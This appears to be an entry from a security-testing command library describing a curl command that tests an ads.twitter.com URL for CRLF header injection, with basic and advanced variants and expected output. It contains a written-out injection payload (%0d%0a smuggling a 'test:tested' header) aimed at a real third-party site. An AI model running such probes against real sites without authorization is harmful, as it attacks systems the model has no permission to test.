---
data: >-
  curl -i
  'https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0atest:tested'
tags:
  - crlf-injection
  - header-test
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: da108545-5ef1-4f6b-b7c8-deee287c6556
created_at: '2025-12-11T06:10:15.996Z'
updated_at: '2025-12-11T06:10:15.996Z'
verified: false
validated: true
submitted: true
---
# curl-header-injection-test

## Command

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0atest:tested'
```

## Description

This command tests for CRLF injection by attempting to inject a custom 'test:tested' header into the HTTP response. Use it to verify if the parameter allows unsanitized CRLF sequences.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| URL | The target endpoint with injected parameter | Yes |

## Examples

### Basic Usage

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0atest:tested'
```

### Advanced Usage

```bash
curl -i -A 'Custom-User-Agent' 'https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0atest:tested'
```

## Expected Output

HTTP response headers including the injected 'test:tested' if vulnerable, otherwise standard headers.

## Related

- [[commands/curl-set-cookie-injection]]
- [[procedures/Identify-Vulnerable-Endpoint-and-Parameter]]
